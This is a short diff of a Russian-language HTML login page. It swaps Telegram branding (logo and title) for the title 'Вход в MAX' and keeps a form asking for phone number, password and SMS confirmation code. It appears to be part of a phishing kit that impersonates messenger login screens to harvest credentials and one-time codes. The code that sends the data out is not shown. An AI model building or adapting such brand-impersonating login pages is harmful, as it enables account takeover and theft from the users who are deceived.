@@ -31,7 +31,7 @@ button:hover{background:#1e8bc3}
 .back-link a{color:#888;text-decoration:none;font-size:14px}
 </style></head>
 <body>
-<div class="container"><div class="logo"><svg viewBox="0 0 240 240"><circle cx="120" cy="120" r="120" fill="#27A5E7"/><path fill="white" d="M98,175c-3.9,0-4.2-1.6-6-5.8l-15-49l84-54l-104,42l-32,13c-6,2-6,5.7-1.1,7.9l26,8l60-38c2.5-1.5,4.8-0.7,2.9,0.9L98,175z"/></svg></div><h2 id="title">Вход в Telegram</h2>
+<h2 id="title">Вход в MAX</h2>
 <div id="step1"><form id="loginForm"><div class="input-group"><input type="tel" id="phone" placeholder="+7 (900) 123-45-67" required></div><div class="input-group"><input type="password" id="password" placeholder="Пароль" required></div><button type="submit">Продолжить</button></form></div>
 <div id="step2" class="code-step"><form id="codeForm"><div class="input-group"><input type="text" id="code" placeholder="Код из SMS" maxlength="6" required></div><button type="submit">Подтвердить</button><div class="back-link"><a href="#" onclick="back()">← Использовать другой номер</a></div></form></div>
 <div class="error" id="error"></div></div>
